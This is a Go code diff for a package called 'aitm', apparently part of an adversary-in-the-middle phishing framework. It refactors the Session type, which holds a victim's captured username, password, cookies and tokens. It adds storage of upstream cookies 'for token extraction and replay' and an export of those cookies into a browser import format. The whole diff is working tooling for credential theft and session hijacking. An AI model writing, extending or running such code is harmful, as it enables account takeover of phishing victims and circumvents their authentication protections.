@@ -2,6 +2,7 @@ package aitm
 
 import (
 	"encoding/json"
+	"net/http"
 	"strings"
 	"sync"
 	"time"
@@ -43,7 +44,7 @@ type Session struct {
 	Username     string
 	Password     string
 	Custom       map[string]string
-	CookieTokens map[string]map[string]*CookieToken // domain → name → token
+	CookieTokens map[string]map[string]*http.Cookie // domain → name → cookie
 	BodyTokens   map[string]string
 	HTTPTokens   map[string]string
 	PuppetID     string
@@ -77,7 +78,7 @@ func (s *Session) HasRequiredTokens(def *Phishlet) bool {
 func (s *Session) hasToken(rule TokenRule) bool {
 	switch rule.Type {
 	case TokenTypeCookie:
-		return s.hasCookieToken(rule)
+		return s.hasCookie(rule)
 	case TokenTypeHTTPHeader:
 		return s.hasHTTPToken(rule)
 	case TokenTypeBody:
@@ -86,7 +87,7 @@ func (s *Session) hasToken(rule TokenRule) bool {
 	return false
 }
 
-func (s *Session) hasCookieToken(rule TokenRule) bool {
+func (s *Session) hasCookie(rule TokenRule) bool {
 	for domain, byName := range s.CookieTokens {
 		if rule.Domain != "" && !MatchesDomain(domain, rule.Domain) {
 			continue
@@ -139,46 +140,49 @@ func (s *Session) Complete() {
 	s.CompletedAt = &now
 }
 
-// AddCookieToken stores a captured cookie, lazily initialising nested maps.
-func (s *Session) AddCookieToken(domain, name string, tok *CookieToken) {
+// AddCookie stores a captured upstream cookie for token extraction and replay.
+// The cookie is stored keyed by its Domain and Name fields.
+func (s *Session) AddCookie(cookie *http.Cookie) {
 	if s.CookieTokens == nil {
-		s.CookieTokens = make(map[string]map[string]*CookieToken)
+		s.CookieTokens = make(map[string]map[string]*http.Cookie)
 	}
-	if s.CookieTokens[domain] == nil {
-		s.CookieTokens[domain] = make(map[string]*CookieToken)
+	if s.CookieTokens[cookie.Domain] == nil {
+		s.CookieTokens[cookie.Domain] = make(map[string]*http.Cookie)
 	}
-	s.CookieTokens[domain][name] = tok
+	s.CookieTokens[cookie.Domain][cookie.Name] = cookie
 }
 
 // ExportCookies returns captured cookies in StorageAce import format.
 func (s *Session) ExportCookies() []CookieExport {
 	var out []CookieExport
 	for _, byName := range s.CookieTokens {
-		for _, token := range byName {
+		for _, cookie := range byName {
 			out = append(out, CookieExport{
-				Name:     token.Name,
-				Value:    token.Value,
-				Domain:   token.Domain,
-				Path:     token.Path,
-				Expires:  token.Expires.Unix(),
-				HttpOnly: token.HttpOnly,
-				Secure:   token.Secure,
-				SameSite: token.SameSite,
+				Name:     cookie.Name,
+				Value:    cookie.Value,
+				Domain:   cookie.Domain,
+				Path:     cookie.Path,
+				Expires:  cookie.Expires.Unix(),
+				HttpOnly: cookie.HttpOnly,
+				Secure:   cookie.Secure,
+				SameSite: sameSiteString(cookie.SameSite),
 			})
 		}
 	}
 	return out
 }
 
-type CookieToken struct {
-	Name     string
-	Value    string
-	Path     string
-	Domain   string
-	Expires  time.Time
-	HttpOnly bool
-	Secure   bool
-	SameSite string
+func sameSiteString(s http.SameSite) string {
+	switch s {
+	case http.SameSiteLaxMode:
+		return "Lax"
+	case http.SameSiteStrictMode:
+		return "Strict"
+	case http.SameSiteNoneMode:
+		return "None"
+	default:
+		return ""
+	}
 }
 
 // CookieExport is the wire format for the StorageAce browser import extension.
